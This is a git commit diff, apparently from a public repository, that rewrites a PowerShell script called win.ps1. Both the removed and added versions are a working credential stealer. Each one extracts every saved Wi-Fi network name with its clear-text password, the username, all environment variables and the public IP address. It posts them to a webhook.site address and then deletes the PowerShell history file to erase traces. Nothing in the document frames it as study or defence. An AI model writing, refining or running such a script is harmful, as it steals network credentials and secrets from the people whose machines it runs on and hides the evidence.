5d9d870693026802263dc30649e517e1fa169964
PeterGriffinAtGmailDotCom <156129816+PeterGriffinAtGmailDotCom@users.noreply.github.com>
2024-01-10 19:56:06 +0200

    Update win.ps1

--- win.ps1
+++ win.ps1
@@ -1,14 +1,27 @@
-netsh wlan show profile | Select-String '(?<=All User Profile\s+:\s).+' | ForEach-Object {
-  $wlan  = $_.Matches.Value
-  $pass = netsh wlan show profile $wlan key=clear | Select-String '(?<=Key Content\s+:\s).+'
-  $IP=(Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content
-  $Body = @{
-    'username' = $env:username
-    'wifi'= $wlan + " : " + $pass
-    'env' = (gci env:*).GetEnumerator() | Out-String
-    'ip' = $IP
-  }
-  Invoke-RestMethod -ContentType 'Application/Json' -Uri https://webhook.site/eb616291-21c4-4959-9e07-a692d2c312c8 -Method Post -Body ($Body | ConvertTo-Json)
+$profiles = netsh wlan show profiles | Select-String '(?<=All User Profile\s+:\s).+' | ForEach-Object {
+  $_.Matches.Value
 }
+
+$wifis = @()
+
+foreach ($profile in $profiles) {
+  $password = netsh wlan show profile $profile key=clear | Select-String '(?<=Key Content\s+:\s).+' | ForEach-Object {
+    $_.Matches.Value.Trim()
+  }
+  $wifis += @{
+    'name' = $profile
+    'password' = $password
+  }
+}
+
+$IP = (Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content
+
+$Body = @{
+  'username' = $env:username
+  'wifi_profiles' = $wifis
+  'env' = (gci env:*).GetEnumerator() | Out-String
+  'ip' = $IP
+}
+Invoke-RestMethod -ContentType 'Application/Json' -Uri https://webhook.site/eb616291-21c4-4959-9e07-a692d2c312c8 -Method Post -Body ($Body | ConvertTo-Json)
+
 Remove-Item (Get-PSReadlineOption).HistorySavePath
-exit
